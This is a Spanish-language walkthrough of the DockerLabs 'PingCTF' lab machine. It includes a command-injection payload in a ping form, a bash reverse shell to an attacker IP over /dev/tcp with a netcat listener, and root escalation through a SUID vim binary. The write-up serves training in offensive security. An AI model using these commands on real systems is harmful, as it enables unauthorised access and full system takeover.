---
icon: linux
---

# PingCTF ​​

## 🖥️ Writeup - PingCTF

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `PHP` `Burp Suite` `Command Injection` `RCE` `SUID`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip PingCTF.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh ping_ctf.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 19:38 CEST
Nmap scan report for 172.17.0.2.
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Ping
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

El único puerto abierto es el puerto `80`, así que vamos a comprobar qué hay alojado.

Encontramos una especie de portal donde podemos verificar la conectividad introduciendo `IPs` o dominios.

![Portal de conectividad](<../../.gitbook/assets/IP verify.png>)

Haremos una prueba verificando la conectividad con Google introduciendo `8.8.8.8`.

Se nos redirige a una página de resultados en la que podemos ver que la URL es la siguiente:

```
http://172.17.0.2/ping.php?target=8.8.8.8
```

Es decir, el archivo `ping.php` ejecuta un comando `ping` al target que le hemos pasado como parámetro.

Si conseguimos inyectar algún comando propio junto con la `IP`, obtendremos un `RCE` y una potencial vía de intrusión.

Vamos a probar el clásico punto y coma después de la `IP`, seguido de un comando nuestro.

```bash
8.8.8.8;whoami
```

![whoami](../../.gitbook/assets/whoami.png)

Como vemos, ha funcionado y estamos interactuando con el usuario `www-data`.

Ahora vamos a intentar obtener una `reverse shell` a través del `RCE`, y para ello utilizaremos `BurpSuite` para interceptar la petición y manipularla con mayor comodidad.

Una vez interceptada la petición, inyectamos el comando:

```bash
bash -c 'bash -i >& /dev/tcp/10.0.4.12/4444 0>&1'
```

Luego seleccionamos el comando y pulsamos `Ctrl + U` para aplicar URL encoding.

Colocamos un listener en el puerto `4444` de nuestra máquina atacante.

```bash
nc -nlvp 4444
```

Hacemos `forward` a la petición y recibimos la `reverse shell` en la máquina atacante.

Info:

```
listening on [any] 4444 ...
connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 56276
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@21a8aa7e4e6e:/var/www/html$
```

## TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```

`ctrl Z`

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.

```bash
sudo -l
```

```bash
find / -perm -4000 -type f 2>/dev/null 
```

```bash
sudo getcap -r / 2>/dev/null
```

Info:

```
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/vim.basic
```

En los binarios con permisos SUID nos llama la atención el último: `vim.basic`.

Es probable que podamos inyectar comandos en el editor de texto y ejecutarlos como root, así que vamos a intentarlo.

Probamos con los siguientes comandos, pero ninguno de ellos funcionó.

```bash
/usr/bin/vim.basic -c ':!bash -p'
```

```bash
/usr/bin/vim.basic -c ':set shell=/bin/sh' -c ':shell'
```

Finalmente, lo conseguimos con el comando:

```bash
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

Info:

```
bash-5.2# whoami
root
bash-5.2# 
```

Ya somos root!
